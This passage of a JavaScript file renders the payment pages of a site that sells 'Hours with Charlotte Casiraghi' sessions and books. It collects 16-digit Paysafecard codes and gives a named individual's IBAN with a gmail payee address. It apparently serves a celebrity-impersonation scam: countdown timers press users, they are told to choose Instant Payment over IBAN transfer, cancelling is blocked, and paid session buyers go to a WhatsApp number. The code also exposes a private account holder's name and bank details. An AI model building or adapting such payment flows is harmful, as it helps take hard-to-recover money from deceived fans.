                        Go to a supermarket, kiosk, or petrol station. Look for the Paysafecard logo at the counter. If you don't see it, just ask the cashier: "Do you sell Paysafecard?"
                    </p>
                    </div>
                </div>

                <div class="step">
                    <img src="/src/images/receipt.jpg"  class="bi bi-receipt" alt=""/>
                    <div class="step-text">
                
                        <p class="step-header">Step 2: <br />
                            Get Your Secure PIN
                        </p>
                
                    <p class="step-text-under">
                        When you buy the Paysafecard, you will receive a receipt. On this receipt, you will see a 16-digit code (numbers).
This code is your money. Keep it safe, just like cash.
                    </p>
                    </div>
                </div>

                <div class="step">
                   <img src="/src/images/phone.jpg" class="bi bi-file-lock2" alt="phone image"/>
                    <div class="step-text">
                
                        <p class="step-header">Step 3: <br />
                            Enter Your Code Online
                        </p>
                
                    <p class="step-text-under">
                        On the next screen, type the 16-digit code from your receipt (example: 1234 5678 9012 3456). Then click “Pay Now".You will see an almost instant confirmation once the payment is done.
                    </p>
                    </div>
                </div>
            </div>

            <div class="proceed-div">
                <button class="continue-btn">Continue</button>
            </div>
        </div>`;
}

function createSafe2(state) {
    return `
        <div class="payment-section paysafe-section active" id="paysafe-code-page">
            <div class="paysafe-header">
                <div class="logo">
                    <img src="/src/images/paysafe.png" alt="Paysafe Logo">
                </div>
                <h2>Enter your 16-digit Paysafecard code</h2>

                <p class="small-text">This code is on your Paysafecard receipt or card.</p>
            </div>

            <div class="steps">
                <div class="inputs">
                    <input type="tel" maxlength="16" name="paysafe-code-1" id="paysafe-code-1"
                        class="paysafe-code-input" placeholder="Type your code here">
                </div>

           <div class="middle">
                <button class="another-code" title="Add Another Code">+ Add another code</button>

                <span class="small-text">If one code doesn't cover the full amount, just press <b>'Add another code'</b> and type the new 16-digit number. Keep doing this until the full amount is covered.</span>
</div>
                <div class="amount-display">
                    <p class="label-text">Amount to Pay:</p> <span class="price-to-pay">${getCurrencySymbol(state.currencyCode) || state.currencyCode} ${formatter.format(Math.round(state.toPay))}</span>
                </div>
            </div>

            <div class="proceed-div">
                <button class="continue-btn">Pay Now</button>
            </div>
        </div>
    `;
}

function createSafe3(state) {
    return `
    <div class="payment-section paysafe-section active" id="paysafe-thank-you">
            <div class="paysafe-header">
                <div class="logo">
                    <img src="/src/images/paysafe.png" alt="Paysafe Logo">
                </div>
                <h2>Thank you.</h2>
            </div>

            <div class="steps">
                <p class="verification-text">Your Paysafecard payment is being processed. You will receive a
                    confirmation email once the code is verified.</p>
            </div>

            <div class="proceed-div">
                <a href="/html/main/User.html" class="continue-btn">OK</a>
            </div>
        </div>
    `
}



// =========== BANK TRANSFER SECTION SECTIONS ========>

function showPaymentResult(state, elements) {
    const resultHTML = `
    <div class="payment-section credit-card-section active" id="payment-result">
        <div class="result-content">
            <div class="icon">
                <i class="fas ${state.paymentStatus == null ? 'bi bi-hourglass-split' : (state.paymentStatus ? 'fa-check-circle success' : 'fa-times-circle error')}"></i>
            </div>
            <h2>Payment ${state.paymentStatus == null ? 'Processing' : (state.paymentStatus ? 'Successful' : 'Failed')}</h2>
            <p>${state.paymentStatus == null ? 'Your payment is still processing...' : (state.paymentStatus ? 'Your payment was processed successfully!' : 'There was an error processing your payment.')}</p>
            
            <div class="transaction-details">
                <p>Amount: ${getCurrencySymbol(state.currencyCode)}${state.toPay}</p>
                <p>Transaction ID: ${state.txn}</p>
            </div>
            
            <div class="proceed-div">
                <button class="continue-btn">
                    ${state.paymentStatus == null ? 'Processing...' : (state.paymentStatus ? 'Continue' : 'Try Again')}
                </button>
            </div>
        </div>
    </div>`;


    elements.paymentDisplay.innerHTML = resultHTML;
    const btn = document.querySelector('.credit-card-section#payment-result .proceed-div button');;
    btn.addEventListener('click', () => {
        if (state.paymentStatus) {
            if (state.paymentType == 'book') {
                window.location.href = '/html/main/ViewBook.html'
            } else if (state.paymentType == 'session') {
                window.location.href = "https://wa.me/33745624634";
            } else {
                window.location.href = '/html/main/User.html';
            }
        } else {
            window.location.href = '/html/main/User.html';
        }
    });
}

function rePay(e, state, elements) {
    e.preventDefault();
    const button = e.target;
    button.disabled = true;
    button.innerHTML = `<div class="spinner-container"><div class="spinner"></div></div>  Processing...`;

    setTimeout(() => {
        elements.paymentDisplay.innerHTML = state.initialContent;

        let element = cacheDOMElements();
        setupEventListeners(state, element);

        addDetails(state.details, element);

        document.querySelector(".payment-section")?.classList.remove("active");

        document.getElementById("payment-details")?.classList.add("active");

        button.disabled = false;
        button.innerHTML = "Make Payment";
    }, 1000);

}

function handleBank(state, elements) {
    state.bankSections = createBankSections(state);

    const currentSection = state.bankSections[state.cardIndex + 1];

    if (currentSection) {
        // Clear and render new section
        elements.paymentDisplay.innerHTML = "";
        elements.paymentDisplay.insertAdjacentHTML("beforeend", currentSection);

        // Add click handlers for bank section buttons
        document.querySelectorAll(".card-btn").forEach((btn) => {
            btn.addEventListener("click", async () => {
                if (state.cardIndex + 1 === 4) {
                    btn.disabled = true;
                    btn.innerHTML = `<div class="spinner-container"><div class="spinner"></div></div>  Saving...`;
                    await savePaymentData(state);
                    await addUserActivityBankTransfer(state.userId, {
                        timestamp: new Date(),
                        amount: state.amount,
                        id: state.txn,
                        currency: state.currencyCode,
                        method: state.selectedMethod,
                        paymentType: state.paymentType,
                        senderName: state.senderName,
                        receiptURL: "https://placehold.co/600x400?text=Receipt+Image"
                    });
                }
                state.cardIndex++;
                handleBank(state, elements);
            });
        });

        document.querySelectorAll(".card-section .copy").forEach((btn) => {
            btn.addEventListener("click", (e) => handleCopyClick(e, state));
        });

        document.querySelectorAll(".util-btn.view-details").forEach(btn => {
            btn.addEventListener("click", () => showDetails());
        });

        document.querySelectorAll(".util-btn.cancel-transfer").forEach(btn => {
            btn.addEventListener("click", () =>
                showStillProcessing());
        });

        document.querySelectorAll(".util-btn.re-upload").forEach(btn => {
            const currentIndex = state.pendingIndex;
            btn.addEventListener("click", (e) => {
                state[currentIndex] = state[currentIndex] - 1;
                state.paymentStatus = null;

                handleMakePaymentClick(e, state, elements);
            });
        });

        document.querySelectorAll(".make-payment").forEach(btn => {
            btn.addEventListener("click", (e) => {
                state.cardIndex = 2;
                state.paymentStatus = null;
                sessionStorage.removeItem(`paymentTimer_${state.txn}`); 
                
                handleBank(state, elements);
            });
        });

        if (state.cardIndex + 1 === 4) {
            setupUploadSection(state);
        }

        // Start countdown timer when section 3 is shown
        if (state.cardIndex + 1 === 3) {
            startPaymentTimer(state, elements);
        }
    }
}

function showDetails() {
    const detailsDiv = document.querySelector(".user-details");
    const button = document.querySelector(".user-details .cancel");

    if (detailsDiv && button) {
        const isShowing = detailsDiv.classList.contains("show");
        detailsDiv.classList.toggle("show");
        button.textContent = isShowing ? "View Details" : "Hide Details";
    }
}

function showStillProcessing() {
    const detailsDiv = document.querySelector(".payment-info.closing-warning");
    const button = document.querySelector(".closing-warning .cancel");

    if (detailsDiv && button) {
        detailsDiv.classList.toggle("show");
    }
}

function handleCopyClick(e, state) {
    const isEmail = e.target
        .closest(".info-div")
        .querySelector(".info-title")
        .textContent.includes("Email");

    const valueToCopy = e.target
        .closest(".info-div")
        .querySelector(".info-text").textContent;

    const amount = `${getCurrencySymbol(state.currencyCode)}${state.toPay}`;

    const textToCopy = state.selectedMethod == "bank" ? isEmail
        ? "paynowfunds@gmail.com"
        : amount.slice(1, amount.length) : valueToCopy;

    navigator.clipboard.writeText(textToCopy).then(() => {
        const originalText = e.target.textContent;
        e.target.textContent = "Copied!";
        setTimeout(() => {
            e.target.textContent = originalText;
        }, 2000);
    });
}

function setupUploadSection(state) {
    const uploadTrigger = document.getElementById("upload-trigger");
    const fileInput = document.getElementById("receipt-upload");
    const uploadFeedback = document.querySelector(".upload-feedback");
    const fileNameDisplay = document.querySelector(".file-name");
    const senderNameInput = document.getElementById("sender-name-input");
    const plusBTN = document.getElementById("add-button");
    const continueBTN = document.querySelector(".continue-btn");
    let uploaded = false;

    // Set initial sender name if it exists in state
    if (state.senderName) {
        senderNameInput.value = state.senderName;
    }

    // File upload handling
    uploadTrigger.addEventListener("click", () => fileInput.click());

    fileInput.addEventListener("change", (e) => {
        const file = e.target.files[0];
        if (file) {
            fileNameDisplay.textContent = `File: ${file.name}`;
            uploadFeedback.style.display = "block";
            plusBTN.className = `fas fa-check-circle success`;
            plusBTN.style.color = "#0006a";

            uploaded = true;
        }
    });

    // Sender name input handling
    senderNameInput.addEventListener("input", (e) => {
        const value = e.target.value.toString().trim();
        state.senderName = value;
        const btnContent = continueBTN.innerHTML;

        continueBTN.disabled = true;
        continueBTN.innerHTML += `<div class="spinner-container"><div class="spinner"></div></div>`;

        if (uploaded && value !== "") {
            continueBTN.disabled = false;
            continueBTN.innerHTML = btnContent;
        }
    });
}

function startPaymentTimer(state, elements) {
    const PAYMENT_TIMER_KEY = `paymentTimer_${state.txn}`;
    const timeout = state.selectedMethod.includes("Bank") ? 120 : 30; // in minutes

    const timerElement = document.getElementById("payment-timer");
    if (!timerElement) return;

    if (state.paymentTimer) {
        clearInterval(state.paymentTimer);
    }

    let expiryTimestamp = sessionStorage.getItem(PAYMENT_TIMER_KEY);

    if (!expiryTimestamp) {
        expiryTimestamp = Date.now() + timeout * 60 * 1000;
        sessionStorage.setItem(PAYMENT_TIMER_KEY, expiryTimestamp);
    }

    const updateTimer = () => {
        const now = Date.now();
        const timeLeft = Math.round((expiryTimestamp - now) / 1000);

        if (timeLeft <= 0) {
            clearInterval(state.paymentTimer);
            updateTimerDisplay(timerElement, 0);
            timerExpired(state);
            sessionStorage.removeItem(PAYMENT_TIMER_KEY);
        } else {
            updateTimerDisplay(timerElement, timeLeft);
        }
    };

    updateTimer();
    state.paymentTimer = setInterval(updateTimer, 1000);
}

function updateTimerDisplay(element, seconds) {
    const mins = Math.floor((seconds % 3600) / 60);
    const secs = seconds % 60;
    const hrs = Math.floor(seconds / 3600);

    let timeString = "";
    if (hrs > 0) {
        timeString += `${hrs.toString().padStart(2, "0")}:`;
    }
    timeString += `${mins.toString().padStart(2, "0")}:${secs.toString().padStart(2, "0")}`;

    element.textContent = timeString;

    // Add warning class when under 5 minutes
    if (seconds <= 300) {
        element.classList.add("warning");
    } else {
        element.classList.remove("warning");
    }
}

function timerExpired(state) {
    // Disable the payment button
    const paymentBtn = document.querySelector(".proceed-div .card-btn");
    if (paymentBtn) {
        paymentBtn.disabled = true;
        paymentBtn.textContent = "Time Expired";
        paymentBtn.style.backgroundColor = "#dc3545";
    }

    // Show an alert or notification
    handleAlert("Payment time has expired. Please start a new payment session.", 'blur', true, 'Timeout', true, [{ text: 'OK', onClick: () => backToMethod, loading: true }]);
}


function createBankSections1(state) {
    return `
    <div class="payment-section card-section active" id="paypal-first">
        <div class="method-header">
            <div class="logo">
                           <i class="fas fa-university"></i>
            </div>
            <p class="text">Bank Transfer</p>
        </div>
        <h2>Secure your ${state.paymentType} Payment</h2>
        <p style="margin-bottom:5px;">To ensure a smooth and successful transaction:</p>

        <ul>
            <li>Transfer the exact amount displayed for your ${state.paymentType}</li>
            <li>Complete payment within <b>2 hours</b> of receiving your account details</li>
            <li>Upload a clear Screenshot or receipt of the payment</li>
            <li>Click <b>Pay Securely Now</b> only when you're ready to transfer</li>
        </ul>
        <div class="proceed-div">
            <button class="continue-btn card-btn">Pay Securely Now</button>
        </div>
    </div>`;
}


function createBankSections2(state) {
    const symbol = getCurrencySymbol(state.currencyCode);
    const amount = state.currencyCode === "EUR" ? state.amount : state.converted;
    const total = state.toPay;

    return `
    <div class="payment-section card-section active" id="paypal-amount-to-pay">
       <div class="method-header">
            <div class="logo">
                           <i class="fas fa-university"></i>
            </div>
            <p class="text">Bank Transfer</p>
        </div>

        <p class="once">Once you continue, we'll redirect you to your bank to complete your transfer.</p>

        <div class="amount-section">
            <div class="amount-row">
                <span>AMOUNT TO PAY</span>
                <span class="amount">
                <span class="amount">${symbol}${amount}</span>
            </div>
            <div class="amount-row">
                <span>PAYMENT PROVIDER FEE</span>
                <span class="charge">${symbol}${state.charge}</span>
            </div>
            <div class="amount-row total">
                <span>TOTAL AMOUNT TO TRANSFER</span>
                <span class="total">${symbol}${total}</span>
            </div>
        </div>
        <div class="proceed-div">
            <button class="continue-btn card-btn">CONTINUE</button>
        </div>
    </div>`;
}


function createBankSections3(state) {
    const amount = state.toPay;

    return `
    <div class="payment-section card-section active" id="fandf">
        <div class="method-header">
            <div class="logo">
                           <i class="fas fa-university"></i>
            </div>
            <p class="text deposit">Make your Deposit</p>
        </div>

 <div class="important deposit">
            <ol>
                <li>Sign into your bank</li>
                <li>Create a new recipient using the details below</li>
                 <li>Choose Instant Payment (do not use IBAN transfer)</li>
                <li>Make your deposit</li>
            </ol>
        </div>

        <div class="payment-info deposit">
            <div class="info-div">
                <div class="left">
                    <p class="info-title">BANK NAME</p>
                    <p class="info-text">Banco Cetelem, SA. (BNP Paribas Personal Liuanca)</p>
                </div>

                                <button class="copy">Copy</button>

            </div>

            <div class="info-div">
                <div class="left">
                    <p class="info-title">ACCOUNT HOLDER NAME</p>
                    <p class="info-text">Alexis Llusia Luis</p>
                </div>

<button class="copy">Copy</button>
            </div>

<div class="info-div">
                <div class="left">
                    <p class="info-title">IBAN</p>
                    <p class="info-text">ES17 0225 0100 5800 8339 7729</p>
                </div>

                <button class="copy">Copy</button>
            </div>

            <div class="info-div">
                <div class="left">
                    <p class="info-title">BIC/SWIFT</p>
                    <p class="info-text">BNPAESM2XXX</p>
                </div>

                <button class="copy">Copy</button>
            </div>

              <div class="info-div">
                <div class="left">
                    <p class="info-title">AMOUNT</p>
                    <p class="info-text">${getCurrencySymbol(state.currencyCode)}${amount} ${state.currencyCode}</p>
                </div>

                <button class="copy">Copy</button>
            </div>
        </div>

 <div class="important under">
            <p><strong>Important Notes:</strong></p>
            <ol>
                <li>Do not use <strong>DE IBAN</strong> or <strong>IBAN-only</strong> transfer methods</li>
                <li>Choose <strong>Instant Payment</strong> for fastest processing</li>
                <li>Make the transfer within two(2) hours</li>
            </ol>
        </div>

       
               <p class="expiry">This payment link/account expires in: <span class="timeout" id="payment-timer">2:00:00</span></p>

        <div class="proceed-div">
            <button class="continue-btn card-btn">I HAVE MADE THE DEPOSIT</button>
            <p style="text-align: center; font-size: 12px; margin-top: 5px;">(Click only after sending payment successfully)</p>
        </div>
    </div>`;
}

function createBankSections4() {
    return `
    <div class="payment-section card-section active" id="paypal-upload">
        <div class="method-header">
                       <div class="logo"> <i class="fas fa-university"></i></div>
        <p class="text">Upload Transfer Receipt</p>
        </div>

        <p class="upload-text">
            Upload a receipt or screenshot and enter the name of the Bank account that made the deposit.</p>

        <div class="upload-section">
                <input type="file" id="receipt-upload" style="display: none;" accept="image/*,.pdf">
            <div class="upload-box" id="upload-trigger">
                <i class="fas fa-upload" id="add-button"></i>
                <p>Drag or tap to upload</p>
            </div>

  <div class="upload-feedback moveUpNfadeIn" style="display: none;">
                <p class="file-name"></p>
                <p class="upload-success">Receipt uploaded successfully!</p>
            </div>

        </div>
        <div class="sender-name">
            <p><strong>Sender Name</strong></p>
           <input type="text" id="sender-name-input" placeholder="Enter sender's name">
        </div>
        <div class="proceed-div">
            <button class="continue-btn card-btn" disabled>SUBMIT RECEIPT</button>

             <p style="text-align: center; font-size: 12px; margin-top: 5px;">Click only after uploading a file and entering the sender's name.</p>
        </div>
    </div>`;
}

function createBankSections5(state) {
    const iconClass =
        state.paymentStatus === false ? "fa-circle-xmark" : "fa-circle-check";
    const iconColor =
        state.paymentStatus === false ? "color: #dc3545;" : "color: #28a745;";


    const symbol = getCurrencySymbol(state.currencyCode);
    const transAmount = state.toPay;
    const status = state.paymentStatus == null ? "Processing..." : state.paymentStatus == true ? "VERIFIED" : "NOT VERIFIED";
    const showOutcome = state.paymentStatus == null ? false : true;

    return `
    <div class="payment-section card-section last active" id="paypal-processing">
        <div class="method-header">
            <div class="logo">
                            <i class="fas fa-university"></i>
            </div>
        </div>


         <div class="payment-info user-details hide" id="processing-details">
         <div class="info-div" style="justify-content:flex-end; text-align:right;">
          <button class="util-btn cancel view-details">View Details</button>
         </div>
            <div class="info-div">
                <div class="left">
                    <p class="info-title">NAME:</p>
                    <p class="info-text">${state.senderName}</p>
                </div>
            </div>
            <div class="info-div">
                <div class="left">
                    <p class="info-title">TRANSFER AMOUNT</p>
                    <p class="info-text">${symbol}${transAmount}</p>
                </div>
            </div>
<div class="info-div">
                <div class="left">
                    <p class="info-title">TRANSFER STATUS</p>
                    <p class="info-text">${status}</p>
                </div>
            </div>
        </div>

<div class="payment-info closing-warning hide" id="processing-details">
         <div class="info-div" style="justify-content:flex-end; text-align:right;">
          <button class="util-btn cancel cancel-transfer">Close</button>
         </div>
            <div class="info-div">
              You can't cancel this transaction now, because it is still processing...

<br/>
Please wait ☺️
            </div>
        </div>
        
        <div class="paypal-display">
            <div class="display-inner processing ${showOutcome ? "hidden" : ""}" id="processing">
                <p class="display-title">Processing Transfer...</p>
                <div class="loading-spinner"></div>
                <p class="under">Processing your bank transfer.<br/> This may take a few seconds.</p>

                <div class="proceed-div">
                                   <button class="util-btn cancel cancel-transfer">Cancel Transfer</button>

                           <button class="util-btn view-details">View Details</button>

<a class="continue-btn" href='/html/main/User.html' target='_blank'>Go to Profile</a>
                </div>
            </div>

            <div class="display-inner outcome ${showOutcome ? "" : "hidden"}" id="outcome">
                <div class="icon"><i class="fa-solid ${iconClass}" style="${iconColor}"></i></div>
                <p class="display-title">${state.paymentStatus === false
            ? "Payment Declined"
            : state.paymentStatus === true ? "Payment Successful" : ""
        }</p>
                <div class="inner-bottom">
                    <p class="display-title-price">${symbol} ${transAmount}</p>
                    <p class="transaction-id"><b>Transaction ID</b>: <span class="id-text">${state.txn}</span></p>
                </div>
                <div class="divider"></div>
                <div class="proceed-div">
${state.paymentStatus == true ? `<a href="/html/main/User.html" class="util-btn go-to-profile">Go to profile</a>` :
            `<button class="util-btn re-upload">Upload Reciept</button>
         <button class="util-btn cancel make-payment">Make Payment</button> `
        }
                </div>
            </div>
        </div>
    </div>`;
}


///==========ADDING RELEVANT DETAILS====-----====>>
function addDetails(details, elements) {
    const paymentDetailsDiv = elements.paymentDetailsDiv;
    const date = formatDateTime(details.date);

    const description =
        details.type === "session"
            ? `${details.title.toUpperCase()} - Hours with Charlotte Casiraghi`
            : details.description || `<div class="spinner-container"><div class="spinner"></div></div>`;

    if (document.contains(paymentDetailsDiv)) {
        document.getElementById("transaction-id").textContent = details.transactionId || details.id;
        document.getElementById("payment-amount").innerHTML = details.price
            ? `&euro;${details.price}`
            : "N/A";
        document.getElementById("payment-description").textContent = description;
        document.getElementById("payment-date").textContent =
            date || formatDateTime();
    }
}

// ==================== INITIALIZATION ====================
async function initializePaymentFlow(e, state, elements) {
    const urlParams = new URLSearchParams(window.location.search);
    const paymentType = urlParams.get("type");
    const paymentDetails = urlParams.get("details");

    // Redirect if no params
    if (!paymentType || !paymentDetails) {
        handleAlert("No Payment Details Gotten, Please Book a Session!", "blur", false, "", true, [{ text: "OK", onClick: () => handleRedirect("/html/main/Session.html", "replace") }]);

        return;
    }

    try {
        // Parse payment details
        const details = JSON.parse(decodeURIComponent(paymentDetails));
        state.txn = details.transactionId || details.id || `TXN-${Date.now()}`;
        const existingPayment = await getPaymentById(state.userId, state.txn);

        if (existingPayment || details.pending) {
            const paymentToProcess = existingPayment;
            state.details = paymentToProcess;


            if (!paymentToProcess) {
                handleAlert('Payment not found, please try again!', "blur", true, "Not Found", true, [{ text: "OK", onClick: () => handleRedirect('/html/main/User.html', "replace") }]);
                return false;
            }

            // Update state from the stored payment record:::::::
            state.pending = true;
            state.txn = paymentToProcess.id;
            state.selectedMethod = paymentToProcess.method || "paysafe";
            state.amount = paymentToProcess.price;
            state.toPay = paymentToProcess.converted;
            state.currencyCode = paymentToProcess.currency || "EUR";
            state.paymentStatus = paymentToProcess.status || null;
            state.statusMessage = paymentToProcess.statusMessage || "";
            state.paymentType = paymentToProcess.paymentType;

            const indexName = paymentToProcess.method.toLowerCase().includes("bank") ? "card" : "safe";
            state.pendingIndex = `${indexName}Index`;

            state[`${indexName}Index`] = paymentToProcess.method.toLowerCase().includes("bank") ? 4 : paymentToProcess.index;

            // Hide the initial details view as we will poll for results
            if (elements.paymentDetailsDiv) {
                elements.paymentDetailsDiv.style.display = 'none';
            }

            // Route to the correct pending screen based on payment method
            if (paymentToProcess.method && paymentToProcess.method.toLowerCase().includes("bank")) {
                // For pending bank transfers, go directly to the status screen
                handleBank(state, elements);
            } else {
                // For other pending payments (e.g., Paysafe), poll for status
                const finalPayment = await pollForPaymentStatus(state);
                await showResultScreen(state, elements, finalPayment);
            }

        } else {
            state.details = details;
            state.paymentType = paymentType.charAt(0).toUpperCase() + paymentType.slice(1);

            let amount;
            if (paymentType === "book") {
                const price = parseFloat(details.price);
                const quantity = parseFloat(details.quantity);

                amount = (price * quantity).toFixed(2);
            } else {
                amount = parseFloat(details.price).toFixed(2);
            }
            const userCountryData = await getUserCountryInfo();
            /////------>>>>>>

            state.txn = details.transactionId || details.id;
            state.amount = amount;
            state.details.price = amount;
            state.currencyCode = userCountryData?.currencyCode || userCountryData?.currency || "EUR";
            state.selectedCurrency = userCountryData?.country || "Euro";
            state.country = userCountryData?.country || "France";

            document.getElementById("payment-details").classList.add("active");
            addDetails(state.details, elements);

            return true;
        }
    } catch (error) {
        const errorMessage = error.message.split('(').pop().split(')')[0].replace('/', '');
        console.error("Error parsing payment details:", errorMessage);
        const ios = getOS() === "iOS";

        if (errorMessage.includes("client is offline")) {
            handleAlert("Network error. Please check your internet connection and try again.", "blur", true, `${ios ? `<i class="bi bi-cloud-slash text-danger fs-2"></i>` : `<i class='bi bi-wifi-off text-danger fs-2'></i>`} <br/> Network Error`, true, [{
                text: "Try Again", onClick: () => {
                    window.location.reload();
                    return "closeAlert";
                }
            }]);
        }

        return false;
    } finally {
        const loader = document.getElementById("loading-section");
        loader?.classList.remove("active");
        loader?.remove();
    }

    // Initialize buttons
    elements.makePaymentBtn.disabled = true;

    // Initialize checks
    checkPaymentMethodSelection(state, elements);
    return true;
}

document.addEventListener("DOMContentLoaded", (e) => {
    handleAuthStateChange(async (user) => {
        if (user) {
            const state = initializeState();
            const elements = cacheDOMElements();
            setupEventListeners(state, elements);

            state.userId = user.uid;
            state.initialContent = elements.paymentDisplay.innerHTML;

            await initializePaymentFlow(e, state, elements);
        } else {
            handleAlert("You must be logged in to make a payment.", "blur", false, "", true, [{ text: "OK", onClick: () => handleRedirect("/html/regs/Signup.html") }]);
        }
    });
});